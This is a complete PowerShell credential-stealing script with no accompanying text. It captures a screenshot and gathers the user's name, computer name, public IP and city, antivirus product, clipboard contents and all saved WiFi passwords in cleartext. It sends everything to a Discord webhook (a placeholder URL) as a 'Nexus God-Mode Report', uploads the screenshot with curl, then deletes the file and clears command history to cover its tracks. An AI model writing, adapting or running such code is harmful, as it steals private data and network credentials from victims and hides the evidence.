# 1. Configuration
$WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE"
$SCREENSHOT_PATH = "$env:TEMP\s.png"

# 2. Capture Screenshot
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
$Graphics.CopyFromScreen(0, 0, 0, 0, $Bitmap.Size)
$Bitmap.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
$Graphics.Dispose()
$Bitmap.Dispose()

# 3. Gather System Info
$User = $env:USERNAME
$PC = $env:COMPUTERNAME
$IPInfo = Invoke-RestMethod ipinfo.io/json
$PublicIP = $IPInfo.ip
$City = $IPInfo.city
$AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
$Clipboard = Get-Clipboard -Raw

# 4. Extract WiFi Keys
$WiFi = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = netsh wlan show prof name=$name key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
    "SSID: $name | Key: $pass"
} | Out-String

# 5. Construct Discord Embed (Emojis are safe here!)
$Payload = @{
    embeds = @(@{
        title = "⚡ Nexus God-Mode Report"
        color = 16711680 # Red
        fields = @(
            @{ name = "👤 Identity"; value = "$User @ $PC"; inline = $True }
            @{ name = "🌐 Location"; value = "$PublicIP ($City)"; inline = $True }
            @{ name = "🛡️ Antivirus"; value = "$AV"; inline = $False }
            @{ name = "📋 Clipboard"; value = if($Clipboard){$Clipboard.Substring(0,[Math]::Min($Clipboard.Length, 200))}else{"Empty"}; inline = $False }
            @{ name = "🔑 WiFi Keys"; value = if($WiFi){$WiFi.Substring(0,[Math]::Min($WiFi.Length, 1000))}else{"None Found"}; inline = $False }
        )
    })
}

# 6. Send to Discord
$Json = $Payload | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $Json -ContentType 'application/json'
curl.exe -F "file=@$SCREENSHOT_PATH" $WEBHOOK

# 7. Cleanup
Remove-Item $SCREENSHOT_PATH
Clear-History
